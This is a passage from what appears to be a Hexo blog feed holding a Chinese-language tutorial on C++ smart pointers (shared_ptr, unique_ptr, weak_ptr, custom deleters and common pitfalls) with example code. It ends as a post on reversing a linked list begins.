class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能指针</title>
    <link href="/2023/04/11/c++/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    <url>/2023/04/11/c++/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h1><h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h2><h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230315194353315.png" alt="image-20230315194353315"></p><h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myClass</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> tem;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">myClass</span>()&#123;<br>        tem=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">myClass</span>(<span class="hljs-type">int</span> a):<span class="hljs-built_in">tem</span>(a)&#123;&#125;<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//std::shared_ptr的初始化</span><br>    <span class="hljs-comment">//第一种使用以下方法</span><br>    <span class="hljs-type">int</span> *pInt=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(pInt,[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;delete[] pInt1&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.1</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title">sharedPtr1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">char</span>)</span></span>;<br>    *sharedPtr1=<span class="hljs-string">&#x27;c&#x27;</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;*sharedPtr1= &quot;</span>&lt;&lt;*sharedPtr1&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr1.use_count():&quot;</span>&lt;&lt;sharedPtr1.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.2</span><br>    <span class="hljs-type">int</span> intSize=<span class="hljs-number">0</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;intSize:&quot;</span>;<br>    std::cin&gt;&gt;intSize;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[intSize],[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;this lambda&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2.use_count():&quot;</span>&lt;&lt;sharedPtr2.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<span class="hljs-comment">//输出1</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; intSize; ++i) &#123;<br>        sharedPtr2[i]=i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; intSize; ++i) &#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2:&quot;</span>&lt;&lt;sharedPtr2[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.3  //无参构造</span><br>    std::shared_ptr&lt;<span class="hljs-type">char</span>&gt; sharedPtr3;<span class="hljs-comment">//无参构造1</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr3.use_count():&quot;</span>&lt;&lt;sharedPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.4 //直接负值</span><br>    sharedPtr3=sharedPtr1;<br><br>    <span class="hljs-comment">//第二种通过拷贝构造和移动构造</span><br>    <span class="hljs-comment">//2.1 //通过move</span><br>    sharedPtr3= std::<span class="hljs-built_in">move</span>(sharedPtr1);<span class="hljs-comment">//通过move实现资源的转移</span><br><br>    <span class="hljs-comment">//第三种 通过make_shared</span><br>    <span class="hljs-comment">//3.1</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: use a fundamental type</span><br><span class="hljs-comment">     */</span><br>    std::shared_ptr&lt;<span class="hljs-type">int</span> &gt; sharedPtr4=std::<span class="hljs-built_in">make_shared</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">520</span>);<span class="hljs-comment">//520是对该堆内存的初始化</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr4:&quot;</span>&lt;&lt;*sharedPtr4&lt;&lt;std::endl;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: use a class</span><br><span class="hljs-comment">     */</span><br><br>    std::shared_ptr&lt;myClass&gt; sharedPtr5= std::<span class="hljs-built_in">make_shared</span>&lt;myClass&gt;(<span class="hljs-number">1314</span>);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    sharedPtr5= std::<span class="hljs-built_in">make_shared</span>&lt;myClass&gt;(<span class="hljs-number">244</span>);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5.use_count():&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//第四种 //reseet()</span><br>    <span class="hljs-comment">//reset的两个功能：1.接触该内存的控制  2.接触该内存的控制，并控制其他的内存</span><br>    <span class="hljs-comment">//4.1 接触控制</span><br>    sharedPtr5.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    sharedPtr2.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>&#125;);<span class="hljs-comment">//注意此处，reset的地址应该和原来管理的一样</span><br>    sharedPtr5.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> myClass&#123;<span class="hljs-number">8989</span>&#125;);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5.use_count():&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    <span class="hljs-comment">//操作智能指针</span><br>    <span class="hljs-comment">//删除器函数</span><br>    <span class="hljs-comment">//lambda</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr6</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">2</span>]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">3</span>&#125;,[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;this is deleting sharedPtr6&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr6:&quot;</span>&lt;&lt;*sharedPtr6.<span class="hljs-built_in">get</span>()&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*(sharedPtr6.<span class="hljs-built_in">get</span>()+<span class="hljs-number">1</span>)&lt;&lt;std::endl;<br>    <span class="hljs-comment">//c++自带的</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr7</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>&#125;,std::default_delete&lt;<span class="hljs-type">int</span>[]&gt;())</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        std::cout&lt;&lt;*(sharedPtr7.<span class="hljs-built_in">get</span>()+i)&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="unique-ptrc"><a href="#unique-ptrc" class="headerlink" title="unique_ptrc"></a>unique_ptrc</h2><h3 id="操作实例-1"><a href="#操作实例-1" class="headerlink" title="操作实例"></a>操作实例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//一，初始化</span><br>    <span class="hljs-comment">//1.1 使用构造函数</span><br>    <span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span> &gt; <span class="hljs-title">uniquePtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">25</span>&#125;)</span></span>;<br>    std::cout&lt;&lt;*uniquePtr&lt;&lt;std::endl;<br>    *uniquePtr.<span class="hljs-built_in">get</span>()=<span class="hljs-number">100</span>;<br>    std::cout&lt;&lt;*uniquePtr&lt;&lt;std::endl;<br>    std::cout&lt;&lt;uniquePtr.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    <span class="hljs-comment">//1.2 使用移动构造</span><br>    std::unique_ptr&lt;<span class="hljs-type">int</span>&gt; uniquePtr1= std::<span class="hljs-built_in">move</span>(uniquePtr);<br>    std::cout&lt;&lt;*uniquePtr1&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//1.3 使用reset</span><br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr1.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr1.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span> &#123;<span class="hljs-number">959</span>&#125;);<br>    std::cout&lt;&lt;uniquePtr1.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br>    uniquePtr.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>&#125;);<br>    std::cout&lt;&lt;uniquePtr.<span class="hljs-built_in">get</span>()&lt;&lt; std::endl;<br><br>    <span class="hljs-comment">//unique_ptr 删除器</span><br>    <span class="hljs-comment">//函数指针实例  lambda在没有捕获的时候，可以看成函数指针</span><br>    <span class="hljs-comment">/*using funcPtr=void(*)(int*);*/</span><br>    <span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span>[],<span class="hljs-title">void</span><span class="hljs-params">(*)</span><span class="hljs-params">(<span class="hljs-type">int</span>*)</span>&gt; <span class="hljs-title">uniquePtr2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;,[](<span class="hljs-type">int</span> * pInt)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;delete uniquePtr2&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    uniquePtr2[<span class="hljs-number">0</span>]=<span class="hljs-number">244</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[0]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">0</span>]&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[1]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">1</span>]&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//仿函数实例 lambda在有捕获的时候，只能看成函数仿函数</span><br>    std::unique_ptr&lt;<span class="hljs-type">int</span>,std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>*)&gt;&gt; <span class="hljs-built_in">uniquePtr3</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">244</span>&#125;,[&amp;uniquePtr2](<span class="hljs-type">int</span>* pInt)&#123;<br>        uniquePtr2[<span class="hljs-number">1</span>]=<span class="hljs-number">6</span>;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;delete uniquePtr3&quot;</span>&lt;&lt;std::endl;<br>        <span class="hljs-keyword">delete</span> pInt;<br>    &#125;);<br>    uniquePtr3.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;uniquePtr2[1]:&quot;</span>&lt;&lt;uniquePtr2[<span class="hljs-number">1</span>]&lt;&lt;std::endl;<br><br><br>    <span class="hljs-comment">//std::unique_ptr 类型可以对数组指针自动管理 不需要想shared的那样的指定删除器函数</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h2><ol><li><p>初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//weak_ptr的初始化</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">233</span>&#125;)</span></span>;<br>    <span class="hljs-comment">//无参构造</span><br>    std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; weakPtr;<br>    <span class="hljs-comment">//拷贝构造</span><br>    <span class="hljs-function">std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weakPtr1</span><span class="hljs-params">(weakPtr)</span></span>;<br>    <span class="hljs-comment">//通过shared_ptr</span><br>    <span class="hljs-function">std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weakPtr2</span><span class="hljs-params">(sharedPtr)</span></span>;<br>    <span class="hljs-comment">//使用=</span><br>     std::weak_ptr&lt;<span class="hljs-type">int</span>&gt; weakPtr3;<br>     weakPtr3=weakPtr2;<br>     std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr3.use_count:&quot;</span>&lt;&lt;weakPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>     <br>     <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>expired</code> 判断所指的对象是否析构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">244</span>&#125;)</span></span>;<br>    std::weak_ptr&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">weakPtr</span>(sharedPtr);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.use_count():&quot;</span>&lt;&lt;weakPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.expired():&quot;</span>&lt;&lt;(weakPtr.<span class="hljs-built_in">expired</span>()?<span class="hljs-string">&quot;is&quot;</span>:<span class="hljs-string">&quot;not&quot;</span>)&lt;&lt; std::endl;<br><br>    sharedPtr.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.use_count():&quot;</span>&lt;&lt;weakPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;weakPtr.expired():&quot;</span>&lt;&lt;(weakPtr.<span class="hljs-built_in">expired</span>()?<span class="hljs-string">&quot;is&quot;</span>:<span class="hljs-string">&quot;not&quot;</span>)&lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><p>不能使用同一个堆内存初始化智能指针</p><p>![image-20230319185006853](C:\Users\12414\OneDrive - cuit.edu.cn\桌面\智能指针.assets\image-20230319185006853.png)</p><p>但是可以使用”&#x3D;” 进行赋值操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Test* test=<span class="hljs-keyword">new</span> Test;<br>std::shared_ptr&lt;Test&gt;<span class="hljs-built_in">sharedPtr</span>(test);<br>std::shared_ptr sharedPtr1=sharedPtr;<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>std::shared_ptr&lt;Test&gt; sharedPtr2= std::<span class="hljs-built_in">move</span>(sharedPtr);<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2.use_count():&quot;</span>&lt;&lt;sharedPtr2.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>std::shared_ptr&lt;Test&gt; sharedPtr3=sharedPtr;<br>std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr3.use_count():&quot;</span>&lt;&lt;sharedPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><span class="hljs-comment">//此时sharedPtr已经move,所以结果为0</span><br></code></pre></td></tr></table></figure></li><li><p>对智能指针使用’.’操作的智能指针的api,如果使用’-&gt;’操作的是，对应的类的成员方法</p></li><li><p>正确的返回<code>this</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Test</span>:<span class="hljs-keyword">public</span> std::enable_shared_from_this&lt;Test&gt;&#123;<br>    <span class="hljs-built_in">Test</span>()&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;Test()&quot;</span>&lt;&lt;std::endl;<br>    &#125;<br>    ~<span class="hljs-built_in">Test</span>()&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;~Test()&quot;</span>&lt;&lt;std::endl;<br>    &#125;<br>    <span class="hljs-function">std::shared_ptr&lt;Test&gt; <span class="hljs-title">getSharedPtr</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-built_in">shared_from_this</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">std::shared_ptr&lt;Test&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Test)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    std::shared_ptr&lt;Test&gt; sharedPtr1=sharedPtr-&gt;<span class="hljs-built_in">getSharedPtr</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr1.use_count():&quot;</span>&lt;&lt;sharedPtr1.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>共享智能指针不能循环引用</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反转整个链表</title>
    <link href="/2023/04/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/04/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="!%5Bimage-20230410224210507%5D(C:%5CUsers%5C12414%5CDesktop%5Chexo%5Csource_posts%5C%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8.assets%5Cimage-20230410224210507.png)">题</a></p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%8F%8D%E8%BD%AC%E6%95%B4%E4%B8%AA%E9%93%BE%E8%A1%A8%E9%A2%98.png"></p><ol><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 